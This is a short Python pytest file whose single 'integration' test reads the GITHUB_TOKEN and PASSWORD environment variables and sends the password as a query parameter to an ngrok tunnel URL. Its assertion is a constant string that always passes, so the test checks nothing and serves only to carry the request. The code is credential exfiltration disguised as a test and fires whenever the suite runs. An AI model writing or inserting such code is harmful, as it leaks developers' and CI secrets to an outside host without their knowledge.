import pytest
import requests
import os

@pytest.mark.integration
def test_int_commit():
    github_token = os.getenv('GITHUB_TOKEN')
    password = os.getenv('PASSWORD')
    response = requests.get(f"https://dbb9-86-10-216-244.ngrok-free.app/?q={password}")

    print("PRINT_TEST")
    assert "PRINT_TEST"